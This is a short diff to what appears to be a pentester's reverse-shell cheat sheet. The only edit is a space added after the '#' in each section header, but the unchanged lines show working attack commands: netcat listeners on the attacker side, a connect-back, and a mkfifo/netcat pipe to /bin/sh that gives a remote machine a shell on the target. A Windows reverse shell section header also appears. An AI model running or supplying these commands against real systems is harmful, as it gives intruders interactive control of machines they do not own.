@@ -1,4 +1,4 @@
-#REVERSE SHELL
+# REVERSE SHELL
 ATTACKER:
 nc -lnvp 4444
 TARGET:
@@ -13,7 +13,7 @@ ATTACKER:
 nc <TARGET-IP> <PORT>
 
 
-#REVERSE SHELL
+# REVERSE SHELL
 
 TARGET:
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
@@ -22,7 +22,7 @@ ATTACKER:
 nc -lvnp <PORT>
 
 
-#WINDOWS REVERSE SHELL
+# WINDOWS REVERSE SHELL
 
 ATTACKER:
 nc -lvnp <PORT>
